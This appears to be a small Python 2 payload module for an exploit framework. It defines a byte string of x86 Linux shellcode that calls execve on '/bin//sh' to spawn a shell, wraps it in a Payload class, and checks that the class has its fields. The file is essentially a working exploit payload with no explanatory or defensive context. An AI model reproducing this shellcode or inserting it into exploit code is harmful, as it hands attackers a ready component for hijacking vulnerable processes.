#coding:UTF-8

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

class Payload(object):
	def __init__(self):
		self.info = 'Information of the Payload.'
		self.data = shellcode

if __name__=='__main__':
    p=Payload()
    if hasattr(p,'info') and hasattr(p,'data'):
        print "Correct Payload."
    else:
        print "Error: Payload missing 'info' or 'data'."
    print p.info
